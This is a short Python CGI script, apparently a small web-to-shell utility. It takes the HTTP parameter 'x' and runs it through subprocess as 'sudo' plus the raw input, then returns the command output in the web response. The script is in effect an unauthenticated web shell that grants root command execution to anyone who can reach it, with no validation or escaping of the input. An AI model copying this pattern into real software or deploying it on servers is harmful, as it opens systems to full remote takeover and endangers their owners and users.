#!/usr/bin/python3

print("content-type: text/html")
print()

import cgi
import subprocess
recieve= cgi.FieldStorage()
cmd=recieve.getvalue("x")

output=subprocess.getoutput("sudo " + cmd)
print(output)
